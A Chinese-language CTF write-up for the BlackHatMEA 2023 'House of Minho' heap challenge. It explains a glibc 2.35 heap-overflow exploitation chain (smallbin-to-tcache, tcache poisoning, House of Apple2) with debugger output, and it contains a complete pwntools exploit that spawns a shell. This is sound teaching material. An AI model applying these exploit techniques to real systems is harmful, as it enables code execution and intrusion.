---
layout: post
title: BlackHatMEA 2023 House of Minho
date: 2024-04-18 13:22:03
tags: pwn heap
---

参考以及题目附件见：[Black Hat 2023 0解Pwn题Houseofminho详细WP - Csome](https://bbs.kanxue.com/thread-279588.htm)
本篇 Writeup 基于参考文章，但对攻击脚本作了一些优化（去除了一些意义不明的代码），并着重于把攻击思路理清楚（原文的思路太跳跃了，并且有一些地方和我的见解不太一样）。

## 程序概况

容器环境：Ubuntu22.04（GLIBC2.35）（本文使用 GLIBC 2.35-0ubuntu3_amd64 进行调试）
保护情况：全部开启

```sh
[*] '/home/cameudis/ctf/practice/houseofminho/pwn'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

附件里提供了程序源码：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define SIZE_SMALL 0x40
#define SIZE_BIG   0x80

char *g_buf;

int getint(const char *msg) {
  int val;
  printf("%s", msg);
  if (scanf("%d%*c", &val) != 1) exit(1);
  return val;
}

int main() {
  setvbuf(stdout, NULL, _IONBF, 0);

  while (1) {
    puts("1. new\n2. show\n3. delete");
    switch (getint("> ")) {
      case 1: { /* new */
        if (g_buf) {
          puts("[-] Buffer in use");
          break;
        }

        if (getint("Size [1=small / 2=big]: ") == 1) {
          g_buf = (char*)malloc(SIZE_SMALL);
        } else {
          g_buf = (char*)malloc(SIZE_BIG);
        }

        printf("Data: ");
        read(STDIN_FILENO, g_buf, SIZE_BIG);  // overflow
        g_buf[strcspn(g_buf, "\n")] = '\0';
        break;
      }

      case 2: { /* show */
        if (!g_buf) {
          puts("[-] Empty buffer");
        } else {
          printf("Data: %s\n", g_buf);
        }
        break;
      }

      case 3: { /* delete */
        if (!g_buf) {
          puts("[-] Empty buffer");
        } else {
          free(g_buf);
          g_buf = NULL;
        }
        break;
      }

      default:
        puts("[+] Bye!");
        return 0;
    }
  }
}
```

漏洞点：不难发现，在 new 功能中，不管我们选择 small 还是 big，最后都能读入 SIZE_BIG 字节，存在 0x40 字节的堆溢出。
 
 但是除了漏洞以外，我们的能力非常少：只能分配 0x40 或者 0x80 大小的堆块，只能同时使用一个堆块，只能在申请出来的时候 edit。

## 攻击思路概括

首先可以想到，对该大小的堆块可以进行 tcache 相关的攻击，比如 tcache poisoning -> House of Apple2。

为了实施 tcache poisoning，在高版本的 GLIBC 中有一个限制就是还要考虑到对应 bin 的 count。在本题中，我们没办法同时申请到两个堆块，因此无法通过 `free()` 来往某个 bin 中放入两个 chunk。

值得注意的是，不只是 `free()` 函数会将堆块放入 tcache。在 `malloc()` 从 smallbin 取堆块的过程中，如果 smallbin 中取出一个堆块后仍有剩余，并且相应的 tcache 未满，则会触发一个循环，将剩余的 smallbin 中的堆块转移到 tcache 中：

```c
if (in_smallbin_range (nb))
    {
      idx = smallbin_index (nb);
      bin = bin_at (av, idx);
      if ((victim = last (bin)) != bin)
        {
          bck = victim->bk;
      if (__glibc_unlikely (bck->fd != victim))
        malloc_printerr ("malloc(): smallbin double linked list corrupted");
          set_inuse_bit_at_offset (victim, nb);
          bin->bk = bck;
          bck->fd = bin;
          if (av != &main_arena)
        set_non_main_arena (victim);
          check_malloced_chunk (av, victim, nb);
#if USE_TCACHE
      size_t tc_idx = csize2tidx (nb);
      if (tcache != NULL && tc_idx < mp_.tcache_bins)
        {
          mchunkptr tc_victim;
          while (tcache->counts[tc_idx] < mp_.tcache_count
             && (tc_victim = last (bin)) != bin)
        {
          if (tc_victim != 0)
            {
              bck = tc_victim->bk;
              set_inuse_bit_at_offset (tc_victim, nb);
              if (av != &main_arena)
            set_non_main_arena (tc_victim);
              bin->bk = bck;
              bck->fd = bin;
              tcache_put (tc_victim, tc_idx); 
                }
        }
        }
#endif
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }
    }
```

我们可以尝试利用这个过程，往 tcache 填入更多的区块。

> 其实看源码可以发现，在取出 smallbin 区块放到 tcache 的过程中，代码并没有做任何检查。也就是说，如果能够 UAF 或溢出修改一个 smallbin 中的 bk 指针，就可以伪造一条 smallbin 链表，往 tcache 中填入任意地址。这个技巧之后也会用到。

但是这又遇到了问题：怎么往 smallbin 里面放入至少两个堆块？我们至少要使 bk 链表存在 2+个堆块，才能使某些堆块进入 tcache。

好吧，让我们先把问题简化成：怎么往 smallbin 里面放入一个堆块？`malloc()` 会在 unsorted bin 大循环中迭代每一个其中的堆块，并把他们放到对应大小的 bin 中。所以想在 smallbin 中放一个堆块，得首先使一个 smallbin 大小的堆块被放到 unsorted bin 之中。

考虑到 small bin 大小都属于 tcache 大小，这个步骤很难完成。但注意到堆溢出可以帮助简化这个流程：先把一个很大的堆块放到 unsorted bin 中，再溢出把它的大小改小即可。

如何把一个很大的堆块放到 unsorted bin 中？其实这个很好办，在本题中我们会用到两个受限情况下很好用的 trick：

1. 溢出修改 Top Chunk 的 size 域，将 0x??XYZ 覆盖为 0xXYZ 后，再申请一个很大的堆块，就可以将 Top Chunk 回收到 unsorted bin 中。（这个技巧来自 house of orange）

2. 如果程序没有使用 `setbuf(stdin, 0)` 关闭标准输入流的缓冲功能，那么在程序使用 `scanf()` 读取很长的数据时，会使用 malloc 和 realloc 分配临时的缓冲区，并在使用完毕后使用 `free()` 将其释放。举例：如果 scanf 读入数据长度为 0x1000，那么会产生如下调用：

  ```c
p = malloc(0x800);
p = realloc(p, 0x1000);
p = realloc(p, 0x2000);
free(p)
  ```

组合使用这两个 trick ，就可以往 unsorted bin 放入一个很大的堆块。并且后续也可以用第二个 trick 触发 unsorted bin 的遍历。

初次以外，本题中我们还需要使用第二个 trick 来往堆上预先放置一些数据。（这个技巧真的很牛）

具体利用时，还需要处理很多细节，步骤并不像这里说的这么直接。

## 具体攻击流程解析

### 信息泄漏

本次攻击需要我们泄漏堆地址以及 LIBC 基址。

关于 LIBC 基址，只要将堆块释放到 unsorted bin 中再泄漏 fd 即可。这里我们使用 house of orange 所用到的 trick，将 top chunk size 溢出修改后，借用 `scanf()` 的缓冲区来触发 `malloc()`，将 top chunk 释放进入 unsorted bin。

```python
add(1, b"a" * 0x48 + p64(0xd11)) # original top chunk size: 0x??d11
sla(b"> ", b'0'*0xfff+b'2') # trigger realloc to put top chunk into unsorted bin
```

然后，再触发一个溢出来把 fd 读出来，就可以计算出 libc 基址。

```python
free()
add(1, b"a" * 0x50) # overflow
show()
ru(b'a'*0x50)
libc_base = u64(io.recv(6).ljust(8, b'\x00')) - 0x219ce0
success("libc_base: "+hex(libc_base))
free()
add(1, b"a" * 0x48 + p64(0xcf1)) # repair corrupted size
```

关于堆地址，最容易泄漏的是已释放堆块的 fd 指针。在本题中，我们只能接触到 tcache，但这不妨碍我们进行泄漏。

在 GLIBC 高版本中，虽然 tcache chunk 的 fd 指针会进行异或加密，但是用于加密的 key 本身就是堆地址 >> 12，再考虑到 tcache bin 都是单向非循环链表，我们只要泄漏最后面的 chunk 的 fd 指针，就可以拿到堆地址。

```python
free()
add(2, b'a') # this chunk is split from old top chunk in unsorted bin
free()
add(1, b"a" * 0x50) # overflow
show()
ru(b'a' * 0x50)
heap_base = u64(ru(b'\n')[:-1].ljust(8, b'\x00')) << 12 # leak tcache protect key
success("heap_base: "+hex(heap_base))
free()
```

### smallbin to tcache（本题关键）

注意到，现在的堆布局在修复部分数据后，大致为这样：

```pwndbg
Allocated chunk | PREV_INUSE
Addr: 0x5d6c2a054000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x5d6c2a054290
Size: 0x1010 (with flag bits: 0x1011)

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x5d6c2a0552a0
Size: 0x50 (with flag bits: 0x51)
fd: 0x5d6c2a055

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x5d6c2a0552f0
Size: 0x90 (with flag bits: 0x91)
fd: 0x5d6c2a055

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x5d6c2a055380
Size: 0xc60 (with flag bits: 0xc61)
fd: 0x7e3344a19ce0
bk: 0x7e3344a19ce0

Allocated chunk
Addr: 0x5d6c2a055fe0
Size: 0x10 (with flag bits: 0x10)

Allocated chunk | PREV_INUSE
Addr: 0x5d6c2a055ff0
Size: 0x10 (with flag bits: 0x11)
```

> **位于原先的 top chunk 之后的两个 0x10 大小区块是什么？**
> 在释放 top chunk 时，为了让 top chunk 在之后 **`malloc()` 遍历 unsorted bin 时** 通过其中的各种检查，GLIBC 会预先在 top chunk 的最后放两个小区块。
> 
> 具体检查包括：
> 1. 当前堆块的 size 是否满足 0x10 <= size <= system_mem
> 2. 后一堆块的 size 是否满足 0x10 <= size <= system_mem
> 3. 后一堆块的 prev_size 是否和当前堆块的 size 相等
> 4. 当前堆块的 bck->fd 是否等于自己，以及 fd 是否指向 unsorted bin（注意这里使用的是前遍历）
> 5. 后一堆块的 prev_inuse 是否为 0

我们之后需要 small bin 中至少有两个堆块，根据前文所述，我们可以先往其中塞一个堆块，然后使用溢出，来伪造一条 small bin 的 bk 链表。

我们的目标是 `smallbin[0x90]`，且后续需要一次绕过 tcache 的请求来触发 unsorted bin 大循环，将区块放入 `smallbin[0x90]` ，也就是说需要满足以下条件：

1. 在 unsorted bin 中需要有一个 0x90 大小的堆块（这个 0x90 可以在堆块进入 unsorted bin 之后再使用溢出修改）；
2. 需要有一次大于 0x90 的 `malloc()`，且不能命中 Tcache。（用 scanf 就行了）

现在在 tcache 中就有一个现成的 0x90 大小区块，一种想法是将其 size 改大后将其释放。问题在于，free() 为了进行后向合并，会检查后续区块的一些合法性，而由于 size 很大，我们不能够通过溢出来布置后续的 fake chunk。（注意区分这里 `free()` 对释放区块的检查以及 `malloc()` 对于 unsorted bin 中的区块的检查）

如果将要释放的堆块记为 chunk A，那么后续两个 chunk 需要满足：
- chunk B：PREV_IN_USE 为 1
- chunk C：PREV_IN_USE 为 1
这样，`free()` 就不会尝试去合并后面的堆块。

这里我们可以采用一种技巧来在堆上*提前布置*一些数据。之前提到，`scanf()` 会在堆上申请缓冲区，因此它一定会把读入的数据存在堆上。我们可以利用这种技术在堆上提前布置 fake chunk 的数据。

在 EXP 中，我们复用了 unsorted bin 的第二个哨兵堆块，并在后面使用技巧布置了一个哨兵堆块。

```pwndbg
Free chunk (tcachebins) | PREV_INUSE
Addr: 0x5ef482d912a0
Size: 0x50 (with flag bits: 0x51)
fd: 0x5ef482d91

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x5ef482d912f0
Size: 0x90 (with flag bits: 0x91)
fd: 0x5ef482d91

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x5ef482d91380
Size: 0xc60 (with flag bits: 0xc61)
fd: 0x7cb42c819ce0
bk: 0x7cb42c819ce0

Allocated chunk
Addr: 0x5ef482d91fe0
Size: 0x10 (with flag bits: 0x10)

Allocated chunk | PREV_INUSE
Addr: 0x5ef482d91ff0
Size: 0x10 (with flag bits: 0x11)

Allocated chunk | PREV_INUSE | IS_MMAPED
Addr: 0x5ef482d92000
Size: 0x30 (with flag bits: 0x33) <- 这个0x33的byte就是提前布置的

Allocated chunk
Addr: 0x5ef482d92030
Size: 0x00 (with flag bits: 0x00)
```

为了提前布置数据，我们在泄漏数据之前加入这样一行代码：

```python
sla(b"> ", b'0'*0xd58 + b'3') # arrange heap layout. '3' is a valid size. take effect in line 74
```

这个神秘的偏移可以通过动态调试拿到。这个'3'也就是 fake chunk 的 size 位。

在解决了后向合并问题之后，我们还需要考虑前向合并问题。显然，只要释放堆块的 PREV_IN_USE bit 是 1，那 `free()` 就不会尝试合并前面的堆块。

于是我们可以写出第一个版本的代码：

```python
add(1, b'a'*0x48 + pack(0xd01))
free()
add(2, b'b') # tcache do not care how large the chunk it gives out (0xd01)
free()
add(1, b'a'*0x48 + pack(0x91))
sla(b"> ", b'0'*0xfff+b'2') # trigger malloc to the big-unsorted-bin-loop and put the fake chunk into small bin
```

在最后一个 `free()` 之前，位于 unsorted bin 中的那个目标堆块信息如下：

```pwndbg
pwndbg> bins
tcachebins
empty
fastbins
empty
unsortedbin
all: 0x56cefdc442f0 —▸ 0x56cefdc44380 —▸ 0x702f51e19ce0 (main_arena+96) ◂— 0x56cefdc442f0
smallbins
empty
largebins
empty

pwndbg> malloc_chunk 0x56cefdc442f0
Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x56cefdc442f0
Size: 0x90 (with flag bits: 0x91)
fd: 0x56cefdc44380
bk: 0x702f51e19ce0

pwndbg> malloc_chunk 0x56cefdc442f0+0x90
Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x56cefdc44380
Size: 0xc60 (with flag bits: 0xc61)
fd: 0x702f51e19ce0
bk: 0x56cefdc442f0
```

然而，如果运行这段代码，会发现我们没有通过位于 unsorted bin 循环中的检测，也就是 top chunk 之后那两个哨兵堆块想要解决的那些检测。具体来说，我们想要放入 small bin 中的那个堆块之后的堆块（也就是 0x56cefdc442f0+0x90），其 PREV_INUSE bit 是 1，这就不能通过 `malloc()` 的检查。

为了通过这个检查，EXP 采用的方法也很精彩：在将目标堆块释放进入 unsorted bin 的时候，在其之前构造一个 fake chunk 并触发两个堆块的合并，从而将目标堆块起始位置前移。这样一来，我们就有机会在目标堆块+0x90 的位置提前布置好两个哨兵堆块。

```python
add(1, b'a' * 0x10 + pack(0) + pack(0x31) + 2*pack(heap_base+0x2c0) + b'a'*0x10 + pack(0x30) + pack(0xd00)) # fake chunk to be consolidated with target chunk
free()
add(2, b'a'*0x50 + pack(0x90) + pack(0x10) + pack(0) + pack(0x11)) # 2 guard fake chunk
free() # trigger a consolidate with the 0x31 fake chunk in chunk-0x40, now we have a fake chunk in unsorted bin
add(1, b'a'*0x10 + pack(0) + pack(0x91))
sla(b"> ", b'0'*0xfff+b'2') # trigger malloc to the big-unsorted-bin-loop and put the fake chunk in chunk-0x40 into small bin
```

此时各个 bin 的状态：

```pwndbg
pwndbg> bins
tcachebins
empty
fastbins
empty
unsortedbin
all: 0x5fb67444a380 —▸ 0x7978dba19ce0 (main_arena+96) ◂— 0x5fb67444a380
smallbins
0x90: 0x5fb67444a2c0 —▸ 0x7978dba19d60 (main_arena+224) ◂— 0x5fb67444a2c0
largebins
empty
```

可以看到，我们已经成功把一个堆块送入了 small bin。接下来就可以通过溢出来伪造一条 smallbin 的 bk 链表了。这里我们就伪造出一条有三个堆块的链表，以备后续使用。（不能再多了）

```python
# construct a fake smallbin-linked list
add(1, flat([
    0, 0,
    0, 0x91, heap_base+0x2c0, heap_base+0x2c0+0x20,
    0, 0x91, heap_base+0x2c0, heap_base+0x2c0+0x40,
    0, 0x91, heap_base+0x2c0+0x20, libc_base+0x219d60,
]))
free()
```

此时，smallbin 数据如下：

```pwndbg
smallbins
0x90 [corrupted]
FD: 0x5df1191ee2c0 ◂— 0x5df1191ee2c0
BK: 0x5df1191ee2c0 —▸ 0x5df1191ee2e0 —▸ 0x5df1191ee300 —▸ 0x74294ce19d60 (main_arena+224) ◂— 0x5df1191ee2c0
```

虽然 FD 链表和 BK 链表完全对不上，但是 malloc 在从 smallbin 取区块的过程中，都是以 bk 进行迭代的。我们接下来调用 `malloc(0x80)` ，就可以触发 smallbin to tcache 的过程：

```python
add(2, b'a') # trigger smallbin-to-tcache process
free()
```

此时各个 bin 状态如下：

```pwndbg
tcachebins
0x50 [  1]: 0x61618d6c42b0 ◂— 0x0
0x90 [  3]: 0x61618d6c42d0 —▸ 0x61618d6c4310 —▸ 0x61618d6c42f0 ◂— 0x0
fastbins
empty
unsortedbin
all [corrupted]
FD: 0x61618d6c4380 —▸ 0x7f82b3e19ce0 (main_arena+96) ◂— 0x61618d6c4380
BK: 0x61618d6c4380 —▸ 0x7f82b3e19ce1 (main_arena+97) ◂— 0xf0000061618d6c43
smallbins
empty
largebins
empty
```

### tcache poisoning & House of Apple2   

由于可以进行溢出，我们已经可以进行 tcache poisoning 了，拥有一次任意写 0x90 字节的原语。接下来就可以通过各种方法将任意写扩大成为控制流劫持，这里我们就使用 House of Apple 2 进行攻击。关于这个手法，推荐参考 [pwn.college 的 IOFILE 章节](https://pwn.college/software-exploitation/file-struct-exploits)。

注意到，0x90 字节小于一个完整的 `_IO_FILE_plus` 结构体大小。因此，如果直接尝试修改标准流的 FILE 结构体的话，是无法做到又改到 flag 又改到 vtable 指针的。

所以我们可以先在堆上伪造一个 `_IO_FILE_plus` 结构体，然后劫持 `_IO_list_all` 到我们的 fake FILE 结构体。我劫持的 vtable 函数是 `__overflow` ，这样会在程序退出时触发攻击。（`exit -> ... -> _IO_flush_all_lockp ->_IO_overflow`）

首先调试拿到一些偏移：

```python
wide_data_off = 0xa0 # wide data field in _IO_FILE
vtable_off = 0xd8 # vtable field in _IO_FILE
wide_data_vtable_off = 0xe0 # vtable field in wide_data FILE structure

_IO_wfile_overflow_ptr = libc_base+0x2160d8 # _IO_wfile_overflow address
__overflow_off = 0x18 # overflow field offset in vtable
do_alloc_off = 0x68 # do_alloc field offset in wide_data vtable

_IO_list_all = libc_base+0x21a680
system = libc_base+0x50d60
```

然后开始进行攻击。

首先，溢出修改目前正位于 `tcache[0x90]` 最前面的堆块，将其 size 改小，fd 修改成该堆块+0x70 的位置。这里把 size 改小是为了之后使用完该堆块将其释放时，可以把该堆块放入另外的 tcache bin。而之所以 fd 是加 0x70，是因为这样我们在写入该堆块的时候，可以顺便设置位于 0x70 处（0x70~0x78）的 fd 指针，通过这种方式完成第二次 tcache poisoning。（这里说是 poisoning 其实不太准确，因为这里本来就没有 fd 指针，是一个完全的 fake chunk）

```python
# heap_base + 0x2d0 is the chunk_0x80(content), heap_base + 0x2c0 is the chunk_0x40(content)
add(1, b"a"*0x10 + p64(0) + p64(0x71) + p64((heap_base + 0x2d0 + 0x70) ^ (heap_base >> 12)))
free()
```

然后，我们申请出刚才修改的这个堆块，在其中填入 IOFILE 结构体，顺便设置 fake chunk 的 fd 指针到 `_IO_list_all`。

```python
add(2, flat({
    0x00+0x10: b"  sh;", # fake FILE struct starts at heap_base + 0x2e0
    0x28+0x10: system,
    0x58+0x10: 0x71,
    0x60+0x10: _IO_list_all ^ (heap_base >> 12),
}, filler=b'\0'))
free()
```

接着我们申请出来的就是 0x70 偏移处的 fake chunk 了，可以在其中继续伪造 IOFILE 结构体。（注意我把 unused 的部分用来存放 widedata 的 vtable 指针）

```python
add(2, flat({ # starts from heap_base + 0x2e0 + 0x60
    wide_data_off-0x60: heap_base+0x2e0 + 0xd0 - wide_data_vtable_off,
    0xd0-0x60:          heap_base+0x2e0 + 0x28 - do_alloc_off, # `unused` in IOFILE
    vtable_off-0x60:    _IO_wfile_overflow_ptr - __overflow_off,
}, filler=b"\x00"))
free()
```

最后，我们把 `_IO_list_all` 申请出来并填上 fake IOFILE 结构体的地址，再触发程序退出，就可以拿到 shell。

```python
add(2, pack(heap_base+0x2e0))   # hijack _IO_list_all
sla(b'> ', b'4') # trigger exit -> ... -> _IO_flush_all_lockp ->_IO_overflow
```

## EXP 脚本

```python
#!/usr/bin/python3
from pwn import *
import sys
context.terminal = ['tmux', 'splitw', '-h']

# ---------------- Environment Config ---------------- #

#context.log_level = 'debug'
context.arch = 'amd64'
filename = "./pwn"

# ------------------- Exploitation ------------------- #

ru  = lambda a:     io.recvuntil(a)
r   = lambda:       io.recv()
sla = lambda a,b:   io.sendlineafter(a,b)
sa  = lambda a,b:   io.sendlineafter(a,b)
sl  = lambda a:     io.sendline(a)
s   = lambda a:     io.send(a)


def add(size, content):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Size [1=small / 2=big]: ", str(size).encode())
    io.sendafter(b"Data: ", content)
 
def show():
    io.sendlineafter(b"> ", b"2")
 
def free():
    io.sendlineafter(b"> ", b"3")

def pwn():

    sla(b"> ", b'0'*0xd58 + b'3') # arrange heap layout (very very niu bi trick) '3' is a valid size. take effect in line 74

    # leak libc and heap

    add(1, b"a" * 0x48 + p64(0xd11)) # top chunk origin size: 0x??D11
    sla(b"> ", b'0'*0xfff+b'2') # trigger realloc to put top chunk into unsorted bin (very niu bi trick)
    free()
    add(1, b"a" * 0x50)
    show()
    ru(b'a'*0x50)
    libc_base = u64(io.recv(6).ljust(8, b'\x00')) - 0x219ce0
    success("libc_base: "+hex(libc_base))
    free()
    add(1, b"a" * 0x48 + p64(0xcf1)) # repair corrupted size

    free()
    add(2, b'a') # this chunk is split from old top chunk in unsorted bin
    free()
    add(1, b"a" * 0x50)
    show()
    ru(b'a' * 0x50)
    heap_base = u64(ru(b'\n')[:-1].ljust(8, b'\x00')) << 12 # leak tcache protect key (which xswl)
    success("heap_base: "+hex(heap_base))
    free()

    # smallbin to tcache

    # construct fake chunk to be consolidate with old top chunk (need to satisfy unlink macro)
    add(1, b'a' * 0x10 + pack(0) + pack(0x31) + 2*pack(heap_base+0x2c0) + b'a'*0x10 + pack(0x30) + pack(0xd00))
    free()
    add(2, b'a'*0x50 + pack(0x90) + pack(0x10) + pack(0) + pack(0x11)) # taken from tcache, but actually a very big chunk (0xd00) overlaping with the old top chunk which is in unsorted bin
    free() # trigger a consolidate with the 0x31 fake chunk in chunk-0x40, now we have a fake chunk in unsorted bin
    add(1, b'a'*0x10 + pack(0) + pack(0x91))

    sla(b"> ", b'0'*0xfff+b'2') # trigger malloc to the big-unsorted-bin-loop and put the fake chunk in chunk-0x40 into small bin

    free()
    # construct a fake smallbin-linked list
    add(1, flat([
        0, 0,
        0, 0x91, heap_base+0x2c0, heap_base+0x2c0+0x20,
        0, 0x91, heap_base+0x2c0, heap_base+0x2c0+0x40,
        0, 0x91, heap_base+0x2c0+0x20, libc_base+0x219d60,
    ]))
    free()
    add(2, b'a') # trigger smallbin-to-tcache process
    free()

    # House of Apple 2

    wide_data_off = 0xa0
    vtable_off = 0xd8
    wide_data_vtable_off = 0xe0
    _IO_wfile_overflow_ptr = libc_base+0x2160d8
    __overflow_off = 0x18
    do_alloc_off = 0x68
    _IO_list_all = libc_base+0x21a680
    system = libc_base+0x50d60

    # we can't hijack data in standard FILE struct directly because we have only *one* 0x80 bytes arbitrary write
    # so we have to fake a FILE struct on heap and hijack the _IO_list_all pointer to it

    # heap_base + 0x2d0 is the chunk_0x80(content), heap_base + 0x2c0 is the chunk_0x40(content)
    add(1, b"a"*0x10 + p64(0) + p64(0x71) + p64((heap_base + 0x2d0 + 0x70) ^ (heap_base >> 12)))
    free()
    add(2, flat({
        0x10: b"  sh;", # fake FILE struct starts at heap_base + 0x2e0
        0x38: system,
        0x68: 0x71,
        0x70: _IO_list_all ^ (heap_base >> 12),
    }, filler=b'\0'))
    free()
    add(2, flat({ # starts from heap_base + 0x2e0 + 0x60
        wide_data_off-0x60: heap_base + 0x2e0 + 0xd0 - wide_data_vtable_off,
        0xd0-0x60:          heap_base + 0x2e0 + 0x28 - do_alloc_off,
        vtable_off-0x60:    _IO_wfile_overflow_ptr - __overflow_off,
    }, filler=b"\x00"))
    free()
    add(2, pack(heap_base+0x2e0))   # hijack _IO_list_all

    sla(b'> ', b'4') # trigger exit -> ... -> _IO_flush_all_lockp ->_IO_overflow

    io.interactive()


# ------------------ Infrastructure ------------------ #

def debug():
    g = gdb.attach(io, """
        source ~/gaio/load_sym.py
        loadsym ~/gaio/libs/2.35-0ubuntu3_amd64/.debug/.build-id/89/c3cb85f9e55046776471fed05ec441581d1969.debug
    """)
    # pause()

if __name__ == "__main__":
    if len(sys.argv) == 1:
        io = process(filename)
    elif sys.argv[1] == "d":
        io = process(filename)
        debug()
    elif sys.argv[1] == "r":
        io = remote(ip, port)
    else:
        print("Usage: ./exp.py [d | r]")
        print("\td for debug")
        print("\tr for remote")
        exit()

    pwn()
```
